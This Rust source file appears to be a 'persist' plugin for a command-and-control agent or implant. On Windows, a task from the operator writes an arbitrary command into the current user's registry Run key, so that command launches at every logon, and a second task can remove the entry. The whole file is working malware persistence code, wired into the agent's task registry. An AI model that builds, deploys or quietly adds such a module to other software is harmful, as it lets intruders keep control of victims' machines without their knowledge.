// persist plugin — install/remove HKCU Run persistence.
// Enabled via the "persist" feature. Uses the registry plugin's reg_set helper.
//
// Args JSON: { "name":"...", "command":"...", "remove": false }

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

// Custom persistence command IDs.
pub const CMD_PERSIST: u32 = 65;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_PERSIST, exec_persist)?;
    Ok(())
}

fn exec_persist(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let name = v["name"].as_str().unwrap_or("").to_string();
        let command = v["command"].as_str().unwrap_or("").to_string();
        let remove = v["remove"].as_bool().unwrap_or(false);

        let run_path = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        if remove {
            match crate::plugins::registry::reg_delete(run_path, &name) {
                Ok(_) => Some(TaskResult::ok(&task.id, format!("persistence removed: {name}\n"))),
                Err(e) => Some(TaskResult::fail(&task.id, format!("persist: {e}"))),
            }
        } else {
            if name.is_empty() || command.is_empty() {
                return Some(TaskResult::fail(&task.id, "persist needs name + command".into()));
            }
            match crate::plugins::registry::reg_set(run_path, &name, &command, "string") {
                Ok(_) => Some(TaskResult::ok(&task.id, format!("persistence installed: {name} = {command}\n"))),
                Err(e) => Some(TaskResult::fail(&task.id, format!("persist: {e}"))),
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "persist is Windows-only".into()))
    }
}
